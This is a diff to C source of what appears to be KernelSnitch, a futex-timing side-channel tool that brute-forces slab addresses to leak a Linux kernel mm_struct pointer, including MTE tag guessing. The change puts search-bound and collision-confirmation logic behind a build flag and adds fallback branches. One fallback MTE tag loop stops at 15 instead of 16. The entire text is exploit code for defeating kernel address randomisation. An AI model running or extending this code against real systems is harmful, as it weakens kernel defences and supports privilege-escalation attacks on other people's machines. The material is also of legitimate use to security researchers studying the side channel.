@@ -73,12 +73,16 @@ struct kernelsnitch_shared_state {
     pthread_t *increase_tids;
     size_t increase_count;
     size_t increase_id;
+#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
     size_t identity_start;
     size_t identity_end;
+#endif
     size_t identity_diff;
+#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
     size_t min_object_index;
     size_t max_object_index;
     int exact_identity_partition;
+#endif
 
     enum kernelsnitch_state state;
 
@@ -214,6 +218,7 @@ static void *__mm_leak(void *arg)
     for (size_t coarse_addr = range->start; (coarse_addr < range->end) && !ks->found; coarse_addr += COARSE_SZ) {
         if ((coarse_addr % (1ULL << 40)) == 0)
             if (ks->verbose) pr_info("[% 3zd] [%016zx-%016llx]\n", range->id, coarse_addr, coarse_addr + (1ULL << 40));
+#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
         size_t coarse_end = coarse_addr + COARSE_SZ;
         if (ks->exact_identity_partition && coarse_end > range->end)
             coarse_end = range->end;
@@ -225,6 +230,10 @@ static void *__mm_leak(void *arg)
             if (candidate_end > slab_addr + mm_slab_sz)
                 candidate_end = slab_addr + mm_slab_sz;
             for (size_t mm_struct_candidate = first_candidate; (mm_struct_candidate < candidate_end) && !ks->found; mm_struct_candidate += ks->mm_struct_sz) {
+#else
+        for (size_t slab_addr = coarse_addr; (slab_addr < coarse_addr + COARSE_SZ) && !ks->found; slab_addr += mm_slab_sz) {
+            for (size_t mm_struct_candidate = slab_addr; (mm_struct_candidate < slab_addr + mm_slab_sz) && !ks->found; mm_struct_candidate += ks->mm_struct_sz) {
+#endif
 
                 size_t found_hash = 1;
                 if (!ks->mte_enabled) {
@@ -238,7 +247,13 @@ static void *__mm_leak(void *arg)
                     }
                 } else {
                     // need to set the tag if mte is enabled
-                    for (size_t tag_candidate = 0; tag_candidate < 16 && !ks->found; ++tag_candidate) {
+                    for (size_t tag_candidate = 0;
+#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
+                         tag_candidate < 16 && !ks->found;
+#else
+                         tag_candidate < 15 && !ks->found;
+#endif
+                         ++tag_candidate) {
                         size_t __mm_struct_candidate = mm_struct_candidate & ~(0xfULL << 56);
                         __mm_struct_candidate |= (tag_candidate << 56);
                         found_hash = 1;
@@ -297,6 +312,7 @@ struct kernelsnitch_shared_state *kernelsnitch_setup(size_t __mm_struct_sz, size
     ks->futexes = SYSCHK(mmap(0, FUTEX_SZ, PROT_NONE, MAP_ANON|MAP_PRIVATE|MAP_NORESERVE, -1, 0));
     for (size_t addr = 0; addr < FUTEX_SZ; addr += FUTEX_MMAP_SZ)
         SYSCHK(mmap((void *)((size_t)ks->futexes + addr), FUTEX_MMAP_SZ, PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED|MAP_FIXED, -1, 0));
+#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
     ks->identity_start = IDENTITY_START;
     ks->identity_end = IDENTITY_END;
     ks->identity_diff =
@@ -305,6 +321,9 @@ struct kernelsnitch_shared_state *kernelsnitch_setup(size_t __mm_struct_sz, size
     ks->max_object_index =
         ((KS_PAGE_SIZE << ks->mm_slab_order) / ks->mm_struct_sz) - 1;
     ks->exact_identity_partition = 0;
+#else
+    ks->identity_diff = ((IDENTITY_END - IDENTITY_START)/ks->thread_cnt);
+#endif
 
     ks->futex_addrs = (volatile size_t *)SYSCHK(mmap(0, sizeof(size_t)*(ks->collisions + 1), PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));
 
@@ -337,6 +356,7 @@ void kernelsnitch_set_profile(
     ks->average = average;
 }
 
+#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
 void kernelsnitch_set_search_bounds(
     struct kernelsnitch_shared_state *ks, size_t identity_start,
     size_t identity_end, size_t min_object_index, size_t max_object_index,
@@ -359,6 +379,7 @@ void kernelsnitch_set_search_bounds(
     ks->max_object_index = max_object_index;
     ks->exact_identity_partition = exact_identity_partition;
 }
+#endif
 
 /**
  * Find collisions for different user space futex addresses within one process and the piled-up hash bucket
@@ -370,8 +391,10 @@ void kernelsnitch_find_collisions(struct kernelsnitch_shared_state *ks)
 #ifndef KERNELSNITCH_THRESHOLD_MULT
 #define KERNELSNITCH_THRESHOLD_MULT 10
 #endif
+#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
 #ifndef KERNELSNITCH_COLLISION_CONFIRMATIONS
 #define KERNELSNITCH_COLLISION_CONFIRMATIONS 1
+#endif
 #endif
     size_t count = 0;
     size_t wanted;
@@ -400,6 +423,7 @@ void kernelsnitch_find_collisions(struct kernelsnitch_shared_state *ks)
         futex_addr = (size_t)&ks->futexes[id];
         ks->times[i] = __measure(ks, futex_addr);
         if (ks->times[i] > (approx_time*KERNELSNITCH_THRESHOLD_MULT)) {
+#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
             int confirmed = 1;
             for (size_t confirmation = 1;
                  confirmation < KERNELSNITCH_COLLISION_CONFIRMATIONS;
@@ -412,6 +436,7 @@ void kernelsnitch_find_collisions(struct kernelsnitch_shared_state *ks)
             }
             if (!confirmed)
                 continue;
+#endif
             count++;
             ks->futex_addrs[count] = futex_addr;
             if (ks->verbose) pr_info("  %016zx\n", futex_addr);
@@ -446,6 +471,7 @@ void kernelsnitch_bruteforce(struct kernelsnitch_shared_state *ks)
         struct mm_leak_arg *mm_leak_arg = (struct mm_leak_arg *)SYSCHK(calloc(1, sizeof(struct mm_leak_arg)));
         mm_leak_arg->ks = ks;
         mm_leak_arg->range.id = i;
+#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
         mm_leak_arg->range.start =
             ks->identity_start + ks->identity_diff*i;
         mm_leak_arg->range.end = i + 1 == ks->thread_cnt
@@ -465,6 +491,14 @@ void kernelsnitch_bruteforce(struct kernelsnitch_shared_state *ks)
             if ((mm_leak_arg->range.end % COARSE_SZ )!= 0)
                 mm_leak_arg->range.end = ((mm_leak_arg->range.end & ~(COARSE_SZ - 1)) + COARSE_SZ);
         }
+#else
+        mm_leak_arg->range.start = IDENTITY_START + ks->identity_diff*i;
+        mm_leak_arg->range.end = IDENTITY_START + ks->identity_diff*(i+1);
+        if ((mm_leak_arg->range.start % COARSE_SZ) != 0)
+            mm_leak_arg->range.start = (mm_leak_arg->range.start & ~(COARSE_SZ - 1));
+        if ((mm_leak_arg->range.end % COARSE_SZ )!= 0)
+            mm_leak_arg->range.end = ((mm_leak_arg->range.end & ~(COARSE_SZ - 1)) + COARSE_SZ);
+#endif
         SYSCHK(pthread_create(&ks->tids[i], 0, __mm_leak, mm_leak_arg));
     }
     for (size_t i = 0; i < ks->thread_cnt; ++i)
